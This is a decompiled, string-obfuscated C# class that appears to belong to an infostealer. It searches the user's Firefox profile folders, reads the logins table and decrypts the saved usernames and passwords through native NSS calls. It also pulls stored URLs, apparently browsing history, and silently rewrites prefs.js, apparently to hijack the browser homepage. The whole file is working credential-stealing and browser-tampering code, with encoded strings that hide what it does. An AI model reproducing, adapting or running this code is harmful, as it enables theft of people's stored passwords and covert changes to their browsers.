using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

internal class Class21
{
	public static List<Class18> smethod_0()
	{
		List<Class18> list = new List<Class18>();
		Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		IEnumerator enumerator = null;
		IEnumerator enumerator2 = null;
		bool flag = false;
		string path = Class12.smethod_18() + _003CModule_003E.smethod_0("уђѰѥѶѳѳѾпљѶѭѺѹѰѧу", 1055);
		if (!Directory.Exists(path))
		{
			return list;
		}
		if (!Directory.Exists(Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("ȬȽȽȩȬȹȬ", 621)) + _003CModule_003E.smethod_0("\u065d\u064cٮٻ٨٭٭٠\u065dه٨ٳ٤٧ٮٹ\u065d\u0651ٳٮ٧٨٭٤ٲ", 1537)))
		{
			return list;
		}
		string text = null;
		string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("⎕⎄⎄⎐⎕⎀⎕", 9172)) + _003CModule_003E.smethod_0("ἻἪἈἝἎἋἋἆἻἡἎἕἂἁἈ\u1f1fἻἷἕἈἁἎἋἂἔ", 8039));
		foreach (string text2 in directories)
		{
			text = text2;
			if (flag)
			{
				break;
			}
			string text3 = null;
			string[] files = Directory.GetFiles(text);
			foreach (string text4 in files)
			{
				text3 = text4;
				if (flag)
				{
					break;
				}
				if (Regex.IsMatch(text3, _003CModule_003E.smethod_0("ۮ۴ۺ۳۲۳ۮڳۮ\u06ec۱۴۩۸", 1693)))
				{
					Class16.smethod_0(text);
					Class16.string_0 = text3;
				}
			}
		}
		string string_ = Class16.string_0;
		Class16.Struct1 struct1_ = default(Class16.Struct1);
		Class16.Struct1 struct1_2 = default(Class16.Struct1);
		Class15 @class = new Class15(string_);
		DataTable dataTable = @class.method_2(_003CModule_003E.smethod_0("ᴞᴈᴁᴈᴎᴙᵭᵧᵭᴋᴟᴂᴀᵭᴠᴢᴷᴒᴡᴢᴪᴤᴣᴾᵶ", 7501));
		DataTable dataTable2 = @class.method_2(_003CModule_003E.smethod_0("☹☯☦☯☩☾♊♀♊☬☸☥☧♊☇★☐☵☎☃☙☋☈☆☏☎☢★☙☞☙♑", 9834));
		try
		{
			enumerator = dataTable2.Rows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				_ = (DataRow)enumerator.Current;
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		Class16.smethod_2(Class16.smethod_3(), bool_0: true, 0L);
		try
		{
			enumerator2 = dataTable.Rows.GetEnumerator();
			while (enumerator2.MoveNext())
			{
				Class18 class2 = new Class18();
				byte[] array = null;
				DataRow dataRow = (DataRow)enumerator2.Current;
				string text6 = (class2.String_2 = Convert.ToString(dataRow[_003CModule_003E.smethod_0("⒰Ⓓ⒤Ⓕ⒅⒣⒴ⒻⒿ⒢⒃⒄⒚", 9430)].ToString()));
				StringBuilder stringBuilder = new StringBuilder(dataRow[_003CModule_003E.smethod_0("≯≤≩≸≳≺≾≯≮≟≹≯≸≤≫≧≯", 8714)].ToString());
				int value = Class16.smethod_1(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
				IntPtr ptr = new IntPtr(value);
				Class16.Struct1 struct1_3 = (Class16.Struct1)Marshal.PtrToStructure(ptr, typeof(Class16.Struct1));
				if (Class16.smethod_4(ref struct1_3, ref struct1_, 0) == 0 && struct1_.int_2 != 0)
				{
					array = new byte[struct1_.int_2 - 1 + 1];
					ptr = new IntPtr(struct1_.int_1);
					Marshal.Copy(ptr, array, 0, struct1_.int_2);
					class2.String_0 = Encoding.ASCII.GetString(array);
				}
				StringBuilder stringBuilder2 = new StringBuilder(dataRow[_003CModule_003E.smethod_0("؞\u0615\u0618؉\u0602؋؏؞؟ث\u061a؈؈،\u0614؉؟", 1659)].ToString());
				int value2 = Class16.smethod_1(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
				ptr = new IntPtr(value2);
				Class16.Struct1 struct1_4 = (Class16.Struct1)Marshal.PtrToStructure(ptr, typeof(Class16.Struct1));
				if (Class16.smethod_4(ref struct1_4, ref struct1_2, 0) == 0 && struct1_2.int_2 != 0)
				{
					array = new byte[struct1_2.int_2 - 1 + 1];
					ptr = new IntPtr(struct1_2.int_1);
					Marshal.Copy(ptr, array, 0, struct1_2.int_2);
					Encoding.ASCII.GetString(array);
					class2.String_1 = Encoding.ASCII.GetString(array);
				}
				list.Add(class2);
			}
			return list;
		}
		finally
		{
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
	}

	public static List<string> smethod_1()
	{
		List<string> list = new List<string>();
		string text = Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("\u09cb\u09da\u09daৎ\u09cb\u09de\u09cb", 2442)) + _003CModule_003E.smethod_0("\u0fdd࿌\u0fee\u0ffb\u0fe8\u0fed\u0fed\u0fe0\u0fdd࿇\u0fe8\u0ff3\u0fe4\u0fe7\u0fee\u0ff9\u0fdd࿑\u0ff3\u0fee\u0fe7\u0fe8\u0fed\u0fe4\u0ff2", 3969);
		string string_ = text;
		if (!Directory.Exists(text))
		{
			return list;
		}
		string[] directories = Directory.GetDirectories(text);
		foreach (string text2 in directories)
		{
			string[] files = Directory.GetFiles(text2);
			foreach (string text3 in files)
			{
				if (Path.GetFileName(text3) == _003CModule_003E.smethod_0("\u1df6\u1dea\u1de7\u1de5\u1de3\u1df5ᶨ\u1df5\u1df7\u1dea\u1def\u1df2\u1de3", 7558))
				{
					text = text2;
					string_ = text3;
				}
			}
		}
		Class16.smethod_0(text);
		Class15 @class = new Class15(string_);
		DataTable dataTable = @class.method_2(_003CModule_003E.smethod_0("ى\u065f\u0656\u065f\u0659\u064eغذغ\u065cو\u0655\u0657غٷٵ٠م٪ٶٻٹٿ٩", 1562));
		foreach (DataRow row in dataTable.Rows)
		{
			list.Add(row[_003CModule_003E.smethod_0("FA_", 51)].ToString());
		}
		return list;
	}

	public static void smethod_2(string string_0)
	{
		string text = Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("BSSGBWB", 3)) + _003CModule_003E.smethod_0("\u0006\u00175 366;\u0006\u001c3(?<5\"\u0006\n(5<36?)", 90);
		string path = text;
		if (!Directory.Exists(text))
		{
			return;
		}
		string[] directories = Directory.GetDirectories(text);
		foreach (string text2 in directories)
		{
			string[] files = Directory.GetFiles(text2);
			foreach (string text3 in files)
			{
				if (Path.GetFileName(text3) == _003CModule_003E.smethod_0("OMZYL\u0011UL", 63))
				{
					text = text2;
					path = text3;
				}
			}
		}
		string text4 = File.ReadAllText(path);
		text4 = text4.Replace(Regex.Match(text4, _003CModule_003E.smethod_0("'!7 \r\" 74\u000ezp0 =%!7 \u000e|!&3 &'\"\u000e|:=?7\"357p~rp|xmp\u000e{i", 82)).ToString(), string.Format(_003CModule_003E.smethod_0("cesdIfdsp>4tdyaesd8ebwdbcf8~y{sfwqs4:64m&k4?-", 22), string_0));
		try
		{
			File.WriteAllText(path, text4);
		}
		catch (Exception)
		{
		}
	}
}
